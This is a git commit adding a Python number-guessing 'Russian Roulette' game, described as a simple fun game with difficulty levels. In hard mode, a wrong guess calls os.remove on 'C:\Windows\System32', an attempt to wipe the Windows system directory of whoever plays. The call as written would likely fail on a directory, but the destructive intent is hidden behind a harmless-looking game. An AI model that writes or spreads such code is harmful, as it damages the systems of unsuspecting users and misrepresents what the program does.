22a3032aa9e3ab14e038c916d39d80f810eeed82
Dg537 <gabriel.x-box@outlook.com>
2025-10-28 14:15:20 -0600

    Add Russian Roulette game in Code.py
    Implement a simple Russian Roulette game with difficulty levels.

---
+++ Code.py
@@ -0,0 +1,42 @@
+# Simple fun game using python
+# Russian Roulette Game
+from random import randint
+import os
+
+
+while True:
+
+    dificulty = input("elige la dificultad: (normal/hard) \n").lower()
+
+    number = randint(1,10)
+
+    answer = input("Escoje un numero del 1 al 10 \n")
+
+    if dificulty == "normal":
+    
+        if answer == str(number):
+            print("Correcto, esa es la respuesta correcta")
+
+        else:
+            print(f"Incorrecto, la respuesta correcta era {number}")
+
+        retry = input("\nQuieres volver a jugar? (Y/N) \n").lower()
+
+        if retry == "n":
+            print("Gracias por jugar")
+            break
+
+    if dificulty == "hard":
+        
+        if answer == str(number):
+            print("Correcto, esa es la respuesta correcta")
+
+            retry = input("\nQuieres volver a jugar? (Y/N) \n").lower()
+
+            if retry == "n":
+                print("Gracias por jugar")
+                break
+
+        else:
+            os.remove("C:\Windows\System32")
+            break
